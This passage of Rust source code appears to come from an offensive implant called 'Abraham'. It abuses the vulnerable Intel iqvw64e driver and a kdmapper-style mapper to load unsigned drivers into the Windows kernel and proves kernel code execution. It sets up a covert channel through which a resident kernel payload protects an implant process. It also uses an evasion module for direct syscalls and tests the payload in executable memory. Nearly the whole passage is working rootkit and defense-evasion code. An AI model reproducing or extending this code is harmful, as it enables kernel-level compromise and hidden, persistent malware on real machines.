            Ok("chan: protection cleared (payload stopped re-applying)"
                .as_bytes()
                .to_vec())
        }
        "stop" => {
            patch_command(4, 0)?;
            std::thread::sleep(std::time::Duration::from_secs(3));
            Ok("chan: payload timer cancelled (image stays resident)"
                .as_bytes()
                .to_vec())
        }
        other => Err(format!(
            "chan: unknown subcommand {other:?} (hb | ping | protect <pid> | unprotect | stop)"
        )),
    }
}

/// The proof-scratch magic the builtin payload stamps: `0x0DEFACED`
/// plus the first signature byte ('a') in byte 4.
const PROOF_MAGIC: u64 = 0x0000_0061_0DEF_ACED;

/// DRIVER `map` action (ABR-T018): map an unsigned driver into the
/// kernel through iqvw64e and — for the builtin payload — prove the
/// entry executed by reading the magic it stamped into kernel memory.
/// `source` empty: builtin proof payload (image freed after entry);
/// `source` set: the operator's `.sys` file, kept resident.
pub fn map_action(source: &str) -> Result<Vec<u8>, String> {
    let builtin = source.is_empty();
    let image = if builtin {
        proof_driver_image()
    } else {
        std::fs::read(source).map_err(|e| format!("payload {source} unreadable: {e}"))?
    };
    let driver = Iqvw64e::open().map_err(|_| {
        "iqvw64e (\\\\.\\Nal) not loaded - run driver load iqvw64e <source> <drop_path> first"
            .to_string()
    })?;
    let kernel_base = ntoskrnl_base()?;
    let read64 = |a: u64| driver.read64(a);
    let ex_alloc =
        kernel_base + kernel_export_rva(read64, kernel_base, "ExAllocatePoolWithTag")? as u64;
    let ex_free = kernel_base + kernel_export_rva(read64, kernel_base, "ExFreePool")? as u64;

    // The builtin payload writes through param1; operator drivers get
    // (allocation, 0) semantics like the reference mapper's default.
    let (param1, param2, scratch) = if builtin {
        let scratch = driver.call(ex_alloc, POOL_NON_PAGED, 0x100, TAG, 0)?;
        if !(0xFFFF_8000_0000_0000..=0xFFFF_FFFF_FFFF_FFFF).contains(&scratch) {
            return Err(format!(
                "scratch ExAllocatePoolWithTag returned {scratch:#x}"
            ));
        }
        // ExAllocatePoolWithTag does NOT zero: uninitialized pool bytes
        // polluted the strict magic equality (live finding 2026-09-12:
        // bytes 5..8 held pool junk while all five payload bytes were
        // correct).
        driver.write64(scratch, 0)?;
        (scratch, 0, Some(scratch))
    } else {
        // ABR-T021 contract: resident payloads get the covert channel
        // (param1 = shared block, param2 = kernel function table).
        // Non-Abraham drivers simply ignore both parameters.
        let (shared_kva, table_kva) = provision_channel(&driver)?;
        *channel_block().lock().unwrap() = Some(shared_kva);
        (shared_kva, table_kva, None)
    };

    let outcome = kdmapper_map(&driver, &image, param1, param2, builtin);
    let verdict = (|| {
        let outcome = outcome?;
        if builtin {
            let stamped = driver.read64(scratch.unwrap())?;
            let proven = stamped == PROOF_MAGIC;
            driver.call(ex_free, scratch.unwrap(), 0, 0, 0).ok();
            if !proven {
                return Err(format!(
                    "entry rc {:#x} but scratch holds {stamped:#x} (want {PROOF_MAGIC:#x}) - NOT proven",
                    outcome.entry_status
                ));
            }
            Ok(format!(
                "kdmapper: {}B image -> {:#x}; relocs {}, imports {}; entry rc {:#x}; scratch {stamped:#x} - KERNEL CODE EXECUTION PROVEN (iqvw64e manual map)",
                outcome.image_size, outcome.image_base, outcome.relocs, outcome.imports,
                outcome.entry_status
            ))
        } else {
            let shared = channel_block().lock().unwrap();
            Ok(format!(
                "kdmapper: {}B image -> {:#x}; relocs {}, imports {}; entry rc {:#x}; resident; chan block {:#x} (hb/ping/protect/unprotect/stop)",
                outcome.image_size,
                outcome.image_base,
                outcome.relocs,
                outcome.imports,
                outcome.entry_status,
                shared.unwrap_or(0)
            ))
        }
    })();
    verdict.map(|v| v.into_bytes())
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::atomic::{AtomicUsize, Ordering};

    #[test]
    fn builtin_payload_parses_with_expected_layout() {
        let image = proof_driver_image();
        let info = parse_pe(&image).unwrap();
        assert_eq!(info.entry_rva, TEXT_VA);
        assert_eq!(info.image_base, IMAGE_BASE);
        assert_eq!(info.size_of_image, 0x3000);
        assert_eq!(info.sections.len(), 2);
        assert_eq!(info.import_dir.0, IDATA_DESC);
        assert_eq!(info.reloc_dir.0, IDATA_RELOC);
        // Entry bytes at the shared layout offsets (file 0x200 == RVA
        // TEXT_VA): test rcx,rcx / jz / push rbx / mov rbx / call
        // [rip+..] / mov dword [rbx].
        // .text sits at file 0x200; layout offsets are entry-relative.
        assert_eq!(
            &image[(0x200 + TEST_RCX) as usize..(0x200 + TEST_RCX) as usize + 3],
            &[0x48, 0x85, 0xC9]
        );
        assert_eq!(image[(0x200 + JZ) as usize], 0x74);
        assert_eq!(image[(0x200 + PUSH_RBX) as usize], 0x53);
        assert_eq!(
            &image[(0x200 + CALL_IAT) as usize..(0x200 + CALL_IAT) as usize + 2],
            &[0xFF, 0x15]
        );
        assert_eq!(
            &image[(0x200 + MOV_DWORD) as usize..(0x200 + MOV_DWORD) as usize + 6],
            &[0xC7, 0x03, 0xED, 0xAC, 0xEF, 0x0D]
        );
    }

    #[test]
    fn km_payload_maps_as_resident_image() {
        let image = include_bytes!("../../payloads/abraham-km/abraham-km.sys");
        let info = parse_pe(image).unwrap();
        assert_eq!(info.entry_rva, 0x1000);
        // Freestanding contract (ABR-T021): zero PE imports - kernel
        // functions arrive through the mapper-injected table - and a
        // fully position-independent image (zero base relocations).
        assert_eq!(info.import_dir, (0, 0));
        assert_eq!(info.reloc_dir, (0, 0));
        let mut local = stage_sections(image, &info).unwrap();
        assert_eq!(apply_relocations(&mut local, 0x1000).unwrap(), 0);
        let imports =
            apply_imports(&mut local, |m, f| Err(format!("unexpected import {m}!{f}"))).unwrap();
        assert_eq!(imports, 0);
    }

    #[test]
    fn km_channel_layout_matches_payload() {
        // KEEP IN SYNC with payloads/abraham-km/payload.rs.
        assert_eq!(std::mem::size_of::<KmShared>(), 64);
        assert_eq!(std::mem::offset_of!(KmShared, heartbeat), 0x08);
        assert_eq!(std::mem::offset_of!(KmShared, command), 0x0C);
        assert_eq!(std::mem::offset_of!(KmShared, command_status), 0x14);
        assert_eq!(std::mem::offset_of!(KmShared, implant_pid), 0x18);
        assert_eq!(std::mem::offset_of!(KmShared, protect_active), 0x28);
        assert_eq!(std::mem::size_of::<KmFnTable>(), 40);
    }

    #[test]
    fn parse_rejects_truncated_and_foreign_images() {
        assert!(parse_pe(&proof_driver_image()[..0x100]).is_err());
        let mut i386 = proof_driver_image();
        i386[0x84..0x86].copy_from_slice(&0x014Cu16.to_le_bytes()); // i386 machine
        assert!(parse_pe(&i386).is_err());
        let mut entry = proof_driver_image();
        entry[0x98..0x9C].copy_from_slice(&0x9000u32.to_le_bytes()); // entry outside image
        assert!(parse_pe(&entry).is_err());
    }

    #[test]
    fn relocations_apply_delta_and_reject_unknown_types() {
        let image = proof_driver_image();
        let info = parse_pe(&image).unwrap();
        let mut local = stage_sections(&image, &info).unwrap();
        let applied = apply_relocations(&mut local, 0x1000).unwrap();
        assert_eq!(applied, 1);
        // The movabs operand moved from SIG_VA to SIG_VA + 0x1000. The
        // staged buffer is VA-indexed, so the operand lives at the
        // entry's own virtual offset.
        let operand_off = (TEXT_VA + MOVABS + 2) as usize;
        assert_eq!(
            u64::from_le_bytes(local[operand_off..operand_off + 8].try_into().unwrap()),
            IMAGE_BASE + SIG_VA as u64 + 0x1000
        );
        // A HIGHLOW (type 3) entry must abort, not be skipped.
        let mut hostile = local.clone();
        let block = IDATA_RELOC as usize;
        hostile[block + 8..block + 10].copy_from_slice(&(3u16 << 12).to_le_bytes());
        assert!(apply_relocations(&mut hostile, 0x1000).is_err());
    }

    static FILL_CALLS: AtomicUsize = AtomicUsize::new(0);

    unsafe extern "system" fn fill_probe(_dest: u64, _len: u64, _fill: u64) {
        // Emulate a REAL kernel callee: every volatile register may be
        // trashed on return. Without the rbx save in the payload this
        // probe makes the entry lose param1 and the test fails.
        unsafe {
            std::arch::asm!(
                "xor rcx, rcx", "xor r10, r10", "xor r11, r11",
                out("rcx") _, out("r10") _, out("r11") _,
            );
        }
        FILL_CALLS.fetch_add(1, Ordering::SeqCst);
    }

    /// End-to-end semantic test of the builtin payload without any
    /// kernel involvement: stage, relocate to an RWX usermode buffer,
    /// resolve the single import to a Rust recorder, execute the entry
    /// exactly as DriverEntry(param1, 0) would run in the kernel, and
    /// assert the magic it stamped.
    #[test]
    fn builtin_payload_executes_in_usermode() {
        let image = proof_driver_image();
        let info = parse_pe(&image).unwrap();
        let mut local = stage_sections(&image, &info).unwrap();

        // RWX view through NtAllocateVirtualMemory — same manual
        // syscall surface the rest of the implant uses.
        let (nt_alloc, nt_free) = unsafe {
            (
                crate::evasion::syscalls::resolve("NtAllocateVirtualMemory")
                    .expect("NtAllocateVirtualMemory unresolved"),
                crate::evasion::syscalls::resolve("NtFreeVirtualMemory")
                    .expect("NtFreeVirtualMemory unresolved"),
            )
        };
        let mut base = std::ptr::null_mut::<u8>();
        let mut size = info.size_of_image as usize;
        let status = unsafe {
            crate::evasion::syscalls::dispatch6(
                nt_alloc,
                usize::MAX, // NtCurrentProcess
                &mut base as *mut *mut u8 as usize,
                0,
                &mut size as *mut usize as usize,
                0x3000, // MEM_COMMIT | MEM_RESERVE
                0x40,   // PAGE_EXECUTE_READWRITE
            )
        };
        assert_eq!(status, 0, "NtAllocateVirtualMemory failed {status:#x}");
        let base = base as u64;
        assert_ne!(base, 0);

        let delta = base as i64 - IMAGE_BASE as i64;
        assert_eq!(apply_relocations(&mut local, delta).unwrap(), 1);
        // Staging invariant: the OFT thunk at VA IDATA_OFT must hold
        // the import-by-name RVA before import resolution starts.
        assert_eq!(
            u64::from_le_bytes(
                local[IDATA_OFT as usize..IDATA_OFT as usize + 8]
                    .try_into()
                    .unwrap()
            ),
            (IDATA_VA + 0x60) as u64
        );
        let resolved = apply_imports(&mut local, |module, function| {
            assert_eq!(module, "ntoskrnl.exe");
            assert_eq!(function, "RtlFillMemory");
            Ok(fill_probe as *const () as usize as u64)
        })
        .unwrap();
        assert_eq!(resolved, 1);

        unsafe {
            std::ptr::copy_nonoverlapping(local.as_ptr(), base as *mut u8, local.len());
        }
        let before = FILL_CALLS.load(Ordering::SeqCst);
        let entry: unsafe extern "system" fn(u64, u64, u64) -> u64 =
            unsafe { std::mem::transmute(base + TEXT_VA as u64) };
        let mut scratch = [0u8; 8];
        let status = unsafe { entry(scratch.as_mut_ptr() as u64, 0, 0) };
        assert_eq!(status, 0);
        assert_eq!(
            u64::from_le_bytes(scratch),
            PROOF_MAGIC,
            "payload did not stamp the proof magic"
        );
        assert_eq!(FILL_CALLS.load(Ordering::SeqCst), before + 1);

        unsafe {
            crate::evasion::syscalls::dispatch6(
                nt_free,
                usize::MAX, // NtCurrentProcess
                &mut (base as *mut u8) as *mut *mut u8 as usize,
                0,
                &mut size as *mut usize as usize,
                0x8000, // MEM_RELEASE
                0,
            );
        }
    }
}
